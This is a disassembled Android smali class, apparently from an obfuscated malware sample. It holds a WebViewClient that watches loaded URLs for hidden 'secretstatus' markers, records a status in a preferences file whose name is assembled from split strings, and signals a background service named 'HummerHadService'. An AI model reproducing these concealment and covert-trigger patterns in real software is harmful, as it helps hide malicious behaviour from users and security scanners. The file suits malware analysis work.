.class public Lgronvp/fquaollmlcgx/ntjpxtepxyy/a;
.super Landroid/webkit/WebViewClient;


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# instance fields
.field private dolicvelockes:Lgronvp/fquaollmlcgx/ntjpxtepxyy/bu;

.field private serveras:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    iput-object p1, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/a;->serveras:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public shouldOverrideUrlLoading(Landroid/webkit/WebView;Ljava/lang/String;)Z
    .locals 6

    const/4 v0, 0x1

    const/4 v1, 0x0

    const-string v2, "secretstatus9"

    invoke-virtual {p2, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_2

    const-string v2, "te"

    iget-object v3, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/a;->serveras:Landroid/content/Context;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "sys"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, "ma"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    new-instance v2, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bv;

    invoke-direct {v2, v1}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bv;-><init>(Landroid/content/SharedPreferences;)V

    invoke-virtual {v2}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bv;->a()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "status"

    const-string v3, "s9"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    sget-object v1, Lgronvp/fquaollmlcgx/ntjpxtepxyy/HummerHadService;->e:Lgronvp/fquaollmlcgx/ntjpxtepxyy/l;

    if-eqz v1, :cond_0

    sget-object v1, Lgronvp/fquaollmlcgx/ntjpxtepxyy/HummerHadService;->e:Lgronvp/fquaollmlcgx/ntjpxtepxyy/l;

    const-string v2, "page3"

    invoke-virtual {v1, v2}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/l;->pserveren(Ljava/lang/String;)V

    :cond_0
    new-instance v1, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bu;

    invoke-direct {v1}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bu;-><init>()V

    iput-object v1, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/a;->dolicvelockes:Lgronvp/fquaollmlcgx/ntjpxtepxyy/bu;

    :cond_1
    :goto_0
    return v0

    :cond_2
    const-string v2, "secretstatus2"

    invoke-virtual {p2, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_3

    const-string v2, "te"

    iget-object v3, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/a;->serveras:Landroid/content/Context;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "sys"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, "ma"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    new-instance v2, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bv;

    invoke-direct {v2, v1}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bv;-><init>(Landroid/content/SharedPreferences;)V

    invoke-virtual {v2}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bv;->a()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "status"

    const-string v3, "s2"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    sget-object v1, Lgronvp/fquaollmlcgx/ntjpxtepxyy/HummerHadService;->e:Lgronvp/fquaollmlcgx/ntjpxtepxyy/l;

    if-eqz v1, :cond_1

    sget-object v1, Lgronvp/fquaollmlcgx/ntjpxtepxyy/HummerHadService;->e:Lgronvp/fquaollmlcgx/ntjpxtepxyy/l;

    const-string v2, "page3"

    invoke-virtual {v1, v2}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/l;->pserveren(Ljava/lang/String;)V

    goto :goto_0

    :cond_3
    const-string v2, "secretstatus3"

    invoke-virtual {p2, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_4

    const-string v2, "te"

    iget-object v3, p0, Lgronvp/fquaollmlcgx/ntjpxtepxyy/a;->serveras:Landroid/content/Context;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "sys"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, "ma"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    new-instance v2, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bv;

    invoke-direct {v2, v1}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bv;-><init>(Landroid/content/SharedPreferences;)V

    invoke-virtual {v2}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/bv;->a()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "status"

    const-string v3, "s3"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    sget-object v1, Lgronvp/fquaollmlcgx/ntjpxtepxyy/HummerHadService;->e:Lgronvp/fquaollmlcgx/ntjpxtepxyy/l;

    if-eqz v1, :cond_1

    sget-object v1, Lgronvp/fquaollmlcgx/ntjpxtepxyy/HummerHadService;->e:Lgronvp/fquaollmlcgx/ntjpxtepxyy/l;

    const-string v2, "page3"

    invoke-virtual {v1, v2}, Lgronvp/fquaollmlcgx/ntjpxtepxyy/l;->pserveren(Ljava/lang/String;)V

    goto/16 :goto_0

    :cond_4
    move v0, v1

    goto/16 :goto_0
.end method
